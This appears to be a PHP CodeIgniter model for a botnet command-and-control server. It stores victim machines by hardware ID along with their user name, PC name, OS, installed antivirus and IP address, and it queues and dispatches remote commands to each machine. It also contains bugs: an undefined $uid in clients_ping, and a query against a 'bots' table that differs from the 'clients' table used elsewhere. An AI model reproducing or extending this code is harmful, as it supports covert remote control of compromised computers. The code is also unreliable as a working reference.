<?php

class Database extends CI_Model {

	function __construct() {
		parent::__construct();
	}

	public function clients_list() {
		$query = $this->db->get('clients');
		if ($query->num_rows() > 0) {
			return $query->result();
		}
	}

	public function clients_from_hardware_id($cid) {
		$query = $this->db->get_where('bots', array('hardware_id' => $cid));
		if ($query->num_rows() > 0) {
			return $query->result();
		} else {
			return false;
		}
	}

	public function clients_exists($cid) {
		$query = $this->db->get_where('clients', array('hardware_id' => $cid));
		if ($query->num_rows() > 0) {
			return true;
		} else {
			return false;
		}
	}

	public function clients_ping($cid) {
		$query = $this->db->get_where('clients', array('hardware_id' => $uid));
		if ($query->num_rows() > 0) {
			return $query->row()->ping;
		} else {
			return false;
		}
	}
	public function clients_insert($cid, $user_name, $pc_name, $os_description, $av_name, $version) {
		if ($this->clients_exists($cid) != true) {
			$data['hardware_id'] = $cid;
			$data['user_name'] = $user_name;
			$data['pc_name'] = $pc_name;
			$data['os_description'] = $os_description;
			$data['av_name'] = $av_name;
			$data['version'] = $version;
			$data['remote_ip'] = $this->input->ip_address();
			$this->db->insert('clients', $data);
			return true;
		} else {
			return false;
		}

	}

	public function clients_update($cid, $user_name, $pc_name, $os_description, $av_name, $version) {
		if ($this->clients_exists($cid)) {
			$data['user_name'] = $user_name;
			$data['pc_name'] = $pc_name;
			$data['os_description'] = $os_description;
			$data['av_name'] = $av_name;
			$data['version'] = $version;
			$data['remote_ip'] = $this->input->ip_address();
			$this->db->where('hardware_id', $cid);
			$this->db->update('clients', $data);
			return true;
		} else {
			return false;
		}

	}

	public function clients_push_command($cid, $cmd_data) {
		if ($this->clients_exists($cid)) {
			$data['command_data'] = $cmd_data;
			$data['hardware_id'] = $cid;
			$data['seen'] = false;
			$this->db->insert('commands', $data);
			return true;
		} else {
			return false;
		}

	}
	public function clients_pop_command($cid, $cstatus = false) {
		if ($this->clients_exists($cid)) {
			$query = $this->db->get_where('commands', array('hardware_id' => $cid, 'seen' => $cstatus), 1);
			if ($query->num_rows() > 0) {
				$row = $query->row();
				$this->clients_update_command($row->command_id, array('seen' => true));
				return $row;
			} else {
				return false;
			}

		} else {
			return false;
		}

	}

	//// PRIVATE SECTION

	private function clients_update_command($command_id, $data) {
		$this->db->where('command_id', $command_id);
		$this->db->update('commands', $data);
	}

}

?>